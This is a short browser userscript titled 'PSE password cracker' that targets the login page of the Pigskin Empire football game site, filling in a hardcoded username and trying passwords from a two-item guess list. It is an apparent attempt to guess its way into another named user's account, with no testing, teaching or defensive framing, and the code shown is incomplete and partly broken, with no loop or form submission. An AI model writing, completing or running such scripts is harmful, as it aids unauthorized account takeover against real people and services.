// ==UserScript==
// @name           PSE password cracker
// @author      jgonieal123
// @description   hopeful password cracker of PSE
// @include        pigskinempire.com/login.aspx
// ==/UserScript==

var Passwords = ["embassy", "stickler"];
var passcount = 1;
var curpass = 0;

document.getElementById(".tries").value = 1;
document.all["username"].value = "master_champ10";
document.all["passwd"].value = Passwords[curpass];
curpass += 1;